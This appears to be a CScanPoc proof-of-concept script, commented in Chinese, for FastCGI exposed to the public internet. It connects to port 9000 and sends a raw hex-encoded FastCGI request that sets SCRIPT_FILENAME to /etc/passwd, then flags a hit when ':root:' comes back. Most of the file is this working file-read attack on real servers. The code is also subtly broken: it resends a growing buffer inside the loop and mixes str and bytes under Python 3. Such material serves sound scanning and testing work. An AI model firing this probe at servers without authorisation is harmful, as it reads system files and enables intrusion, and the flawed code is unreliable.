# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import socket
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Fcgi_0001'  # 平台漏洞编号，留空
    name = 'fcgi 暴露于公网'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        由于fcgi和webserver对script路径级参数的理解不同出现的问题。
        除此之外，由于fcgi和webserver是通过网络进行沟通的，因此目前越来越多的集群将fcgi直接绑定在公网上，所有人都可以对其进行访问。
        这样就意味着，任何人都可以伪装成webserver，让fcgi执行我们想执行的脚本内容。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Fcgi'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c423d49c-8d56-4ffe-83ab-d5c38db600e5'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 获取主机IP地址
            o = urllib.parse.urlparse(self.target)
            target_ip = socket.gethostbyname(o.hostname)
            # print(target_ip)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3.0)
                sock.connect((target_ip, 9000))
                data = """
                        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
                        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
                        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
                        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50 
                        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
                        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
                        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49 
                        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f 
                        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
                        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
                        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
                """
                data_s = ''
                for _ in data.split():
                    data_s += chr(int(_, 16))
                    sock.send(data_s)
                try:
                    ret = sock.recv(1024)
                    if ret.find(':root:') > 0:
                        #security_hole('fcgi vulnerable')
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                except Exception as e:
                    pass
                sock.close()
            except Exception as e:
                pass

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
